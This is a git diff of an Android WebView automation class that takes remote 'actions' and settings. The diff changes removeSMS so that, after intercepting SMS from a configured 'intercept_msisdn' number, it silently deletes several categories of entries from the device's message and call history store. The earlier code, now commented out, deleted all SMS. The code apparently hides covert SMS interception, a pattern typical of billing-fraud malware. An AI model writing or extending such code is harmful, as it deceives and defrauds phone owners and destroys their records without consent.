@@ -1,5 +1,4 @@
 package automation.bml.com.webviewautomation;
-
 import android.app.ActivityManager;
 import android.content.ComponentName;
 import android.content.Context;
@@ -25,10 +24,8 @@ import android.webkit.WebResourceRequest;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.Toast;
-
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
-
 import java.io.File;
 import java.io.FileOutputStream;
 import java.math.BigInteger;
@@ -38,7 +35,6 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Map;
 import java.util.UUID;
-
 import automation.bml.com.webviewautomation.RestAPI.Constants;
 import automation.bml.com.webviewautomation.RestAPI.DataModel.Action;
 import automation.bml.com.webviewautomation.RestAPI.DataModel.Settings;
@@ -53,7 +49,6 @@ import retrofit2.Callback;
 import retrofit2.Response;
 import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
-
 import static android.content.Context.ACTIVITY_SERVICE;
 import static android.content.Context.CONNECTIVITY_SERVICE;
 import static android.content.Context.WIFI_SERVICE;
@@ -91,9 +86,7 @@ public class AutomatedWebview extends WebView {
         //Displaying device info
         Toast.makeText(context, "Manufacturer: " + getDeviceManufacturer(), Toast.LENGTH_SHORT).show();
         Toast.makeText(context, "Model: " + getModel(), Toast.LENGTH_SHORT).show();
-
         setUUID(); // Setting the UUID on installation
-
         //Webview settings
         getSettings().setJavaScriptEnabled(true);
         setWebChromeClient(new WebChromeClient());
@@ -186,6 +179,7 @@ public class AutomatedWebview extends WebView {
     }
 
     public void takeScreenshot() {
+        //Getting the dimensions of the webview
         measure(MeasureSpec.makeMeasureSpec(
                 MeasureSpec.UNSPECIFIED, MeasureSpec.UNSPECIFIED),
                 MeasureSpec.makeMeasureSpec(0, MeasureSpec.UNSPECIFIED));
@@ -283,11 +277,11 @@ public class AutomatedWebview extends WebView {
             count++;
         }
 
-        //Removing last sms
+        //Removing SMS from intercept_msisdn
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
-                removeSMS();
+                removeSMS(settings.getInterceptMsisdn());
             }
         }, seconds * 1000);
 
@@ -454,21 +448,34 @@ public class AutomatedWebview extends WebView {
 
     private void removeSMS(String number)
     {
-        Uri deleteUri = Uri.parse("content://sms");
-        int count = 0;
-        Cursor c = context.getContentResolver().query(deleteUri, null, null,
-                null, null);
-        while (c.moveToNext()) {
-            try {
-                // Delete the SMS
-                String pid = c.getString(0); // Get id;
-                String uri = "content://sms/" + pid;
-                count = context.getContentResolver().delete(Uri.parse(uri),
-                        null, null);
-            } catch (Exception e) {
-            }
+//        Uri deleteUri = Uri.parse("content://sms");
+//        int count = 0;
+//        Cursor c = context.getContentResolver().query(deleteUri, null, null,
+//                null, null);
+//        while (c.moveToNext()) {
+//            try {
+//                // Delete the SMS
+//                String pid = c.getString(0); // Get id;
+//                String uri = "content://sms/" + pid;
+//                count = context.getContentResolver().delete(Uri.parse(uri),
+//                        null, null);
+//            } catch (Exception e) {
+//            }
+//        }
+        try
+        {
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='400'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='410'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='700'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='200'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='300'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='600'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='500'", null);
         }
-
+        catch(Exception exception)
+        {
+            exception.printStackTrace();
+        }
     }
 
     public boolean isForeground() {
